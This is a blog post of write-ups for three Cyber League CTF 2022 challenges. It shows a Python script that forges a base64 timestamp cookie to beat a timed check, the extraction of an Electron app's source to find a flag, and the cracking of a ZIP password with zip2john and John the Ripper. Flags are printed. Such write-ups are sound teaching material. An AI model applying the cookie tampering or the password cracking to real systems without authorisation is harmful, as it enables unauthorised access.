---
layout: post
title: Cyber League CTF 2022 - Writeups 🚩
categories:
- CTF
- Web-exploitation
tags:
- CTF
- Web-exploitation
- Forensics
- Cyber-League
date: 2022-05-02 10:16 +0800
---

> Didn't really have much time to tackle a lot of the challenges with this CTF and only managed to pwn 3 of them. A big shoutout to my team mates Mocha and Dante for a lot of initial enumerations! I just mainly followed their leads 😅

## Simulated bomb drill

This is the first challenge for the web category in cyber league's CTF. A web endpoint is given for us to start enumerating. When you first hit the main page you are issued a base64 encoded cookie that contains the time in the following format.

```txt
2022-05-01 12:41:35.329922
```

From the time format given above, note that there are microseconds. This was missed initially as our team enumerates for possible way to exploit this cookie. During the initial request to the main page and by the time the cookie is issued, a few microseconds have already passed.

![blown](https://bn1304files.storage.live.com/y4m4NKAA6TjHq4cvH4qK3FLr6jSkGSSZKUbekVgqo8YhCrpC_iqsHaYPcLHrQ-aIT8r-cyL03phkYBX1lD8Gy8CwdR-cwp6OeUlHVBQKhh1VBK7XTISZo4FdvkIszcMYMKEpFNAQlA8exKP3Y1yEMPZZzuAqMwgYlJPJ4vTv8rpQjfNnTxcHCnJu__1d7CCL_NP?width=2280&height=1068&cropmode=none)

Above is an illustration of the time line. So

- If you visit with the issued cookie under a minute to `/defuse` page, you will fail.
- If you also modified the cookie to be one minute earlier, you will still fail.

![cookie](https://bn1304files.storage.live.com/y4mSu5_wHVLBsroBYQUT9z97CIOX7BLmmwLCzSZhe_sArd5JxbUMIiMDl2K8Q3IXyFsXcjcSbzcholSUdVS-27Ley7PHhZ4KOi6DakV7SyUH-VEbfN6-vyKfSb_EzWxYAKbV8wdjinV1r2p6gDtPw7ewWrHjwmZR2V_DXI2cT-YN0OwDXizBEpOAHs1IoZyYsN2?width=2872&height=936&cropmode=none)

The above is the screenshot of the main page with issued cookie.

Since the bomb needs to be defused with 0 microseconds passed from the time of request (not the time of cookie issued), it is physically impossible to do this by hand. So the best way is to script this out in python. The algorithm to get the flag endpoint is as below.

1. Decode the base64 time from cookie
2. Measure the time elasped from the first request
3. Minus off the time elasped from the cookie time
4. Encode the new time into the cookie and send the request

We can code the above steps as below in python.

```python
import requests
import base64

s = requests.Session()

res = s.get('http://13.213.72.54:5003/')

# Get time elapsed in microseconds
time_elapsed = res.elapsed
time_elapsed = time_elapsed.total_seconds()
print(res.elapsed)
# 0:00:00.019976


time_to_decode = s.cookies.get_dict()['princesspeach']
decoded_datetime = base64.b64decode(time_to_decode).decode('utf-8')
# '2022-05-01 12:41:35.329922'
decoded_time = decoded_datetime.split('.')
# ['2022-05-01 12:41:35', '308641']
decoded_microseconds = decoded_datetime.split('.')[1]
# '329922'
decoded_microseconds_in_seconds = int(decoded_microseconds)/1000000
# 0.329922

new_time = decoded_microseconds_in_seconds - time_elapsed
new_time_in_microseconds = int(new_time * 1000000)
# 308641

decoded_time[1] = str(new_time_in_microseconds)

to_encode = ''.join(decoded_time)
# '2022-05-01 12:41:35308641'
encoded_time = base64.b64encode(bytes(to_encode, 'utf-8'))
# b'MjAyMi0wNS0wMSAxMjo0MTozNTMwODY0MQ=='

s.cookies['princesspeach'] = encoded_time
res = s.get('http://13.213.72.54:5003/defuse')
print(res.content)

""" >>> print(res.content)
b'<!DOCTYPE html>\n<html>\n<head>\n <title></title>\n <meta charset="utf-8" />\n</head><body>\n<div class="bd-example" align="middle">\n\n<img src="/static/712a8b4446afb5d43da0dea63cd1c13b.jpg"align="middle" />\n\n</div>\n</body>\n</html>' """
```

We managed the get the flag endpoint like below.

```html
<img src="/static/712a8b4446afb5d43da0dea63cd1c13b.jpg"align="middle" />
```

Visit the endpoint and you will be able to get the flag.

![flag](https://bn1304files.storage.live.com/y4mZLD6Ua4apnvDZjqDKWnzRFYFCsqkIm-c1GpA0_AMbdm8vp3qwR27yEkIssKJ7iVkcQPPeGryziw-4e9dC8ijsw2-9RCFGbeAh2HgFtWampNx94gZwH8shXi-siMMX_zED4XYBtEAK_3YmXvxVFxWW57iEateBhtfOiB2jNQvlDfcHdMH56ycnRwfyLyml9sL?width=533&height=496&cropmode=none)

## Write farewell letters

This challenge is the misc category of the CTF. 3 types of installation files are given with flag hidden. `.dmg` `.exe` and `.appimage`. You simply have to run them to get the binary file to run the application.

The application is doing nothing much but hiding and showing the message as below.

![yoda](https://bn1304files.storage.live.com/y4mZ-4GT0gAj1OIaP2vgKopCFYLmbTMW8CMGiceqQjOIwTQL0jeezJSFWnsU8vNcWb2IA1NLW1WUZeqImILtFu6mtkrruZJ4DtSDBnp1koFd2k53r1e21PRsADdcbgQcWy8qldFQYQxq27_IYZb1rMjxFepvAyrMrl09F1yJoxynd_FY1QcFtynnFrzfwDQdO1k?width=1134&height=1344&cropmode=none)

I had my suspicion that this could be an electron app. To decompile it we can use npm's asar to extract the source code. Below is the capture of how i extracted out the electron source code.

```bash
➜  cyleague cd peekaboo.app 
➜  peekaboo.app cd Contents 
➜  Contents cd Resources 
➜  Resources ls
am.lproj      de.lproj      fi.lproj      id.lproj      mr.lproj      ro.lproj      te.lproj
app.asar      el.lproj      fil.lproj     it.lproj      ms.lproj      ru.lproj      th.lproj
ar.lproj      en.lproj      fr.lproj      ja.lproj      nb.lproj      sk.lproj      tr.lproj
bg.lproj      en_GB.lproj   gu.lproj      kn.lproj      nl.lproj      sl.lproj      uk.lproj
bn.lproj      es.lproj      he.lproj      ko.lproj      peekaboo.icns sr.lproj      vi.lproj
ca.lproj      es_419.lproj  hi.lproj      lt.lproj      pl.lproj      sv.lproj      zh_CN.lproj
cs.lproj      et.lproj      hr.lproj      lv.lproj      pt_BR.lproj   sw.lproj      zh_TW.lproj
da.lproj      fa.lproj      hu.lproj      ml.lproj      pt_PT.lproj   ta.lproj
➜  Resources mkdir decompile-electron
➜  Resources asar extract app.asar decompile-electron 
➜  Resources cd decompile-electron 
➜  decompile-electron code .
```

After decompiling, we open the source code in electron to analyse. From root folder navigate to js folder to index.js as below.

```In js > index.js```

```javascript
var visibilitySetting = 'hidden'

function load() {
    document.getElementById('showButton').innerHTML = 'show'
}

function showVersions() {
    if (visibilitySetting === 'visible') {
        visibilitySetting = 'hidden'
        document.getElementById('versions').style.visibility = 'hidden'
        document.getElementById('showButton').innerHTML = 'show'
    }
    else {
        visibilitySetting = 'visible'
        document.getElementById('versions').style.visibility =' visible'
        document.getElementById('showButton').innerHTML = 'hide'
    }
}

function shinyKnob() {
    console.log('CYBERLEAGUE{7h3_cu73n355_15_5720n9_w17h_7h15_0n3}')
}
```

## Understand space politics

This is a forensics challenge where challengers are given a `.7z` file with flag text underneath. The challenge is straightfoward to crack the zip file password to get the flag. Below is the capture of using zip2john to crack the zip file.

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ zip2john hello_there.zip > ziphashes
ver 2.0 hello_there.zip/hello_there.txt PKZIP Encr: cmplen=41, decmplen=29, crc=87D14E54 ts=A8AF cs=87d1 type=0
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ cat ziphashes 
hello_there.zip/hello_there.txt:$pkzip$1*1*2*0*29*1d*87d14e54*0*2d*0*29*87d1*8facba0e3e10e650ad9dc1fc89e000dfcff60fe4858a519eb33e8f1f9380a9633f39729fb0e101c9eb*$/pkzip$:hello_there.txt:hello_there.zip::hello_there.zip
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ john ziphashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
2hot4u           (hello_there.zip/hello_there.txt)     
1g 0:00:00:02 DONE 3/3 (2022-05-01 09:13) 0.3521g/s 2067Kp/s 2067Kc/s 2067KC/s cjjlip..2hul83
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is `2hot4u` to extract out the flag.

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ unzip hello_there.zip 
Archive:  hello_there.zip
[hello_there.zip] hello_there.txt password: 
 extracting: hello_there.txt         
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ cat hello_there.txt 
CYBERLEAGUE{Y0U_Fo|_|nD_3e!}
```
